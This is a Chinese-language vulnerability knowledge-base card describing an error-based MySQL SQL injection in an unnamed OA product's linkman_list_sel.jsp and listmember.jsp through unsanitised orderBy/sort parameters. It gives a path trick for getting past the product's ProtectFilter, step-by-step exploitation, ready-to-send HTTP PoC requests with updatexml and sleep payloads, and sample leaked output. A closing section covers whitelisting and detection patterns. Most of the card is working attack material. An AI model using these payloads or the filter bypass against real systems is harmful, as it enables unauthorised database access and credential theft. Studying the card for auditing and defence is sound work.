---
id: web-generic-sqli-oa-jsp-orderby-sort-updatexml
title: OA JSP orderBy/sort 未走 sqlstr 导致 MySQL 报错注入（linkman_list_sel / listmember）
type: scenario
domain: web
path: web/generic/sqli
technique: oa-jsp-orderby-sort-sqli
tags:
- java
- jsp
- mysql
- sql-injection
- order-by
- error-based
- oa
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V32
  verified_at: '2026-11-05T06:02:29+08:00'
  notes: 已对照原文与截图核对：linkman_list_sel.jsp/listmember.jsp 的orderBy/sort直接拼接且ParamUtil.get仅UnicodeToUTF8；linkman updatexml实测回显root@localhost。注意原文listmember实际PoC为IF(1=1,SLEEP(5),1)时间盲注，卡中listmember的updatexml示例为同构推导payload；原文未给产品版本；PoC未复现
url: /docs/web/generic/sqli/web-generic-sqli-oa-jsp-orderby-sort-updatexml/
draft: false
kb_aliases:
- OA orderBy 注入
- linkman_list_sel.jsp 注入
- listmember.jsp 注入
- updatexml 报错注入
- ParamUtil.get 注入
- ProtectFilter 绕过注入
---

## 一句话结论

某 OA 的 `linkman_list_sel.jsp` 与 `listmember.jsp` 把请求参数 `orderBy`/`sort` 直接拼进 SQL 的 `ORDER BY` 子句，未经过 `StrUtil.sqlstr()` 的引号闭合处理；`ParamUtil.get()` 只做 UTF-8 解码、不做过滤，攻击者可用 `updatexml()` 等报错函数把子查询结果带进错误信息，形成 MySQL 报错注入。

## 原理

- **拼接点**：
  - `linkman_list_sel.jsp`：`sql += " order by " + orderBy + " " + sort;`，`orderBy`/`sort` 来自 `ParamUtil.get(request, "orderBy")`/`"sort"`，为空时默认 `id`/`desc`。
  - `listmember.jsp`：`String sql = "select name from sq_user where isValid=1 ORDER BY " + orderBy + " " + sort;`，同样直接拼接。
- **为什么绕过了防护**：同文件其他条件（`customer`、`linkmanName`、`kind`、`nick`、`career`）通过 `StrUtil.sqlstr()` 包裹，`sqlstr` 会在值两侧加单引号并把 `'` 替换为 `''`；但 `orderBy`/`sort` 是标识符位置，没有加引号，也没有走 `sqlstr`，因此字符串过滤不适用。
- **参数来源**：`ParamUtil.get(request, name)` 只执行 `request.getParameter(name)` + `StrUtil.UnicodeToUTF8(temp)`，不检查关键字/引号/括号，完全可控。
- **注入类型**：`ORDER BY` 位置不能直接 `UNION`，但可用 MySQL 报错函数 `updatexml(1, concat(0x7e, (select ...), 0x7e), 1)`、`extractvalue`、`floor(rand()*2)` 等让错误信息回显数据；也可用 `IF()`/`SLEEP()` 做布尔/时间盲注。
- **ProtectFilter 前置**：OA 全局 `ProtectFilter` 会拦截参数中的 `update`/`select` 等关键字；原文通过路径中加入 `exclude="true"` 的 `mywork.jsp` 片段（如 `/test/../mywork.jsp/../目标.jsp`）使过滤器提前放行，再注入。若直接请求被 302 到 `error.jsp?type=SQLInject`，需要先绕过过滤器。
- **鉴权**：两个 JSP 可能受 `DownloadFilter`/`AuthorityInterceptor` 影响；原文通过 `;common.js` 或路径片段绕过登录过滤，JSP 自身是否二次校验需按目标确认。

## 触发条件

- 目标为使用该 OA 代码库的应用，存在 `linkman_list_sel.jsp`/`listmember.jsp` 且可访问。
- 数据库为 MySQL（原文报错注入基于 `updatexml`）；其他数据库需换用对应报错/盲注函数。
- 目标 `ProtectFilter` 可被 `exclude` 路径/`error.jsp` 绕过，或未启用。
- 参数 `orderBy`/`sort` 未被 WAF/代码二次过滤。

## 利用步骤

1. 访问目标 JSP，确认 `orderBy`/`sort` 参数被接受（默认 `id`/`desc`）。
2. 若被 ProtectFilter 拦截，构造 URL 插入 `mywork.jsp` 等 `exclude="true"` 片段，例如 `/oa/test/../mywork.jsp/../linkman_list_sel.jsp`。
3. 用 `orderBy=updatexml(1,concat(0x7e,(select user()),0x7e),1)` 触发报错，观察响应中的 `XPATH syntax error` 与 `~root@localhost~`。
4. 替换子查询提取库名、表名、用户哈希等；注意 `updatexml` 报错长度限制（约 32 字符），可分段 `substr`。
5. 若无报错回显，改用 `IF(...,SLEEP(5),0)` 时间盲注或布尔差异。

## PoC

```http
GET /oa/test/../mywork.jsp/../linkman_list_sel.jsp?orderBy=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)&sort=asc HTTP/1.1
Host: target:8088
User-Agent: Mozilla/5.0
Accept: */*
Connection: close
```

响应中的错误信息：

```text
java.sql.SQLException: XPATH syntax error: '~root@localhost~'
```

`listmember.jsp` 同形：

```http
GET /oa/test/../mywork.jsp/../listmember.jsp?orderBy=updatexml(1,concat(0x7e,(select%20database()),0x7e),1)&sort=asc HTTP/1.1
Host: target:8088
```

## 变体与关联

- **其他 ORDER BY 注入点**：原文通过 FileLocator 搜索 `"order by" AND NOT "!privilege.isUserPrivValid("` 找到多处 JSP；同样模式可批量审计。
- **报错函数**：`updatexml`/`extractvalue` 适合 MySQL 5.1+；`floor(rand()*2)` 适合无 `updatexml` 权限；`GTID_SUBSET` 等新函数可备选。
- **盲注**：`orderBy=if((select substr(user(),1,1))='r',sleep(3),0)` 观察响应时间。
- **过滤器绕过**：`/test/../mywork.jsp/../`、`;mywork.jsp`、`error.jsp` 片段；不同版本 `config_protect.xml` 的 exclude 列表不同。
- 关联卡片：[[web-generic-auth-oa-downloadfilter-protectfilter-path-substring-bypass]]、[[web-generic-sqli-mes-hql-append-find-actions]]。

## 检测与防御

- **代码**：`orderBy`/`sort` 使用白名单映射（如 `id/name/date` + `asc/desc`），不直接拼接；所有值参数化；`sqlstr` 只适用于字符串值，不能替代标识符白名单。
- **过滤器**：修复 ProtectFilter 的 `exclude` 子串匹配，改为规范化后的精确路径；对 `orderBy` 参数做关键字/函数检测。
- **检测**：`orderBy`/`sort` 含 `updatexml`、`extractvalue`、`sleep`、`if(`、`select`、括号/逗号；响应出现 `XPATH syntax error`、SQL 异常堆栈；同一 JSP 大量不同 orderBy 值。
- **应急**：审计访问日志中的注入 payload 与响应错误；修复 JSP 并回归；评估数据库账号权限，轮换可能泄露的凭据。
